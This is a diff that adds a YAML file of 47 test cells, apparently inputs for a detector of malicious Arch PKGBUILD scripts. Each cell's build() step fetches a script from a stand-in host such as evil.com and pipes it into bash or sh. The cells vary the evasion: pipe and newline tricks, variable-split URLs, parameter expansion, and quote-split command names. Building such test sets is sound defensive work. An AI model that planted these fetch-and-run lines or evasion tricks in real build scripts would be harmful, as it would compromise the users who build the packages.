@@ -1,0 +1,291 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |
+      build() {
+        make
+        curl evil.com/stage.sh |& bash
+  id: 01-pipe-ampersand
+- vars:
+    payload: |
+      build() {
+        make
+        curl evil.com/stage.sh |& sh
+  id: 02-pipe-ampersand-sh
+- vars:
+    payload: |
+      build() {
+        make
+        wget -qO- evil.com/stage.sh |& bash
+  id: 03-wget-pipe-ampersand
+- vars:
+    payload: |
+      build() {
+        make
+        curl evil.com/stage.sh |
+      bash
+  id: 04-bare-newline-pipe
+- vars:
+    payload: |
+      build() {
+        make
+        curl evil.com/stage.sh |
+      sh
+  id: 05-bare-newline-sh
+- vars:
+    payload: |
+      build() {
+        make
+        wget -qO- evil.com/stage.sh |
+      bash
+  id: 06-wget-bare-newline
+- vars:
+    payload: |
+      build() {
+        make
+        curl evil.com/stage.sh |
+      env bash
+  id: 07-bare-newline-env
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl evil.com/stage.sh | bash
+  id: 08-x-equals-1
+- vars:
+    payload: |
+      build() {
+        make
+        X=; curl evil.com/stage.sh | bash
+  id: 09-x-empty
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; wget evil.com/stage.sh | bash
+  id: 10-x-equals-1-wget
+- vars:
+    payload: |
+      build() {
+        make
+        X+=1; curl evil.com/stage.sh | bash
+  id: 11-x-plus-equals
+- vars:
+    payload: |
+      build() {
+        make
+        declare X=1; curl evil.com/stage.sh | bash
+  id: 12-declare-prefix
+- vars:
+    payload: |
+      build() {
+        make
+        local X=1; curl evil.com/stage.sh | bash
+  id: 13-local-prefix
+- vars:
+    payload: |
+      build() {
+        make
+        readonly X=1; curl evil.com/stage.sh | bash
+  id: 14-readonly-prefix
+- vars:
+    payload: |
+      build() {
+        make
+        typeset X=1; curl evil.com/stage.sh | bash
+  id: 15-typeset-prefix
+- vars:
+    payload: |
+      build() {
+        make
+        X=1 curl evil.com/stage.sh | bash
+  id: 16-env-prefix
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl https://github.com/evil/stage.sh | bash
+  id: 17-x-equals-1-github
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl https://gitlab.com/evil/stage.sh | bash
+  id: 18-x-equals-1-gitlab
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl https://sourceforge.net/evil/stage.sh | bash
+  id: 19-x-equals-1-sourceforge
+- vars:
+    payload: |
+      build() {
+        make
+        X=1; curl https://raw.githubusercontent.com/evil/stage.sh | bash
+  id: 20-x-equals-1-raw-gh
+- vars:
+    payload: |
+      build() {
+        make
+        U=evil; V=com/stage.sh; curl $U.$V | bash
+  id: 21-nested-var-dot
+- vars:
+    payload: |
+      build() {
+        make
+        U=evil.com; V=stage.sh; curl $U/$V | bash
+  id: 22-nested-var-slash
+- vars:
+    payload: |
+      build() {
+        make
+        U=https; V=evil.com/stage.sh; curl $U//$V | bash
+  id: 23-nested-var-scheme
+- vars:
+    payload: |
+      build() {
+        make
+        U=evil.com/stage.sh; curl ${U/evil/legit} | bash
+  id: 24-pattern-replace
+- vars:
+    payload: |
+      build() {
+        make
+        U=evil.com/stage.sh; curl ${U//evil/legit} | bash
+  id: 25-pattern-replace-all
+- vars:
+    payload: |
+      build() {
+        make
+        U=evil.com/stage.sh; curl ${U/#evil/legit} | bash
+  id: 26-pattern-replace-prefix
+- vars:
+    payload: |
+      build() {
+        make
+        U=evil.com/stage.sh; curl ${U/%sh/bash} | bash
+  id: 27-pattern-replace-suffix
+- vars:
+    payload: |
+      build() {
+        make
+        U=xxevil.com/stage.sh; curl ${U:2} | bash
+  id: 28-substring-prefix
+- vars:
+    payload: |
+      build() {
+        make
+        U=evil.com/stage.shxx; curl ${U:0:-2} | bash
+  id: 29-substring-suffix
+- vars:
+    payload: |
+      build() {
+        make
+        U=evil.com/stage.sh; curl ${U:0:10} | bash
+  id: 30-substring-partial
+- vars:
+    payload: |
+      build() {
+        make
+        U=EVIL.COM/STAGE.SH; curl ${U,,} | bash
+  id: 31-case-lowercase
+- vars:
+    payload: |
+      build() {
+        make
+        U=evil.com/stage.sh; curl ${U^^} | bash
+  id: 32-case-uppercase
+- vars:
+    payload: |
+      build() {
+        make
+        U=evil.com; curl $U/stage.sh | bash
+  id: 33-var-domain
+- vars:
+    payload: |
+      build() {
+        make
+        U=evil; curl $U.com/stage.sh | bash
+  id: 34-var-domain-suffix
+- vars:
+    payload: |
+      build() {
+        make
+        U=.com; curl evil$U/stage.sh | bash
+  id: 35-var-tld
+- vars:
+    payload: |
+      build() {
+        make
+        U=evil.com/stage; curl $U.sh | bash
+  id: 36-var-path
+- vars:
+    payload: |
+      build() {
+        make
+        U=stage.sh; curl evil.com/$U | bash
+  id: 37-var-filename
+- vars:
+    payload: |
+      build() {
+        make
+        c'url https://evil.com/stage.sh | bash
+  id: 38-quote-injection-1
+- vars:
+    payload: |
+      build() {
+        make
+        c"url https://evil.com/stage.sh | bash
+  id: 39-quote-injection-2
+- vars:
+    payload: |
+      build() {
+        make
+        cu"rl https://evil.com/stage.sh | bash
+  id: 40-quote-injection-3
+- vars:
+    payload: |
+      build() {
+        make
+        cur"l https://evil.com/stage.sh | bash
+  id: 41-quote-injection-4
+- vars:
+    payload: |
+      build() {
+        make
+        cur'l https://evil.com/stage.sh | bash
+  id: 42-quote-injection-5
+- vars:
+    payload: |
+      build() {
+        make
+        kasablanca https://evil.com/stage.sh | bash
+  id: 43-kasablanca
+- vars:
+    payload: |
+      build() {
+        make
+        vncviewer evil.com:5900 < https://evil.com/stage.sh | bash
+  id: 44-vncviewer
+- vars:
+    payload: |
+      source=("https://evil.com/stage.sh\x00")
+      build() {
+        make
+        bash "$srcdir/stage.sh"
+  id: 45-source-null-byte
+- vars:
+    payload: |
+      source=("https://evil.com/stage .sh")
+      build() {
+        make
+        bash "$srcdir/stage .sh"
+  id: 46-source-space
+- vars:
+    payload: |
+      source=("https://evil.com/stage$.sh")
+      build() {
+        make
+        bash "$srcdir/stage$.sh"
+  id: 47-source-dollar
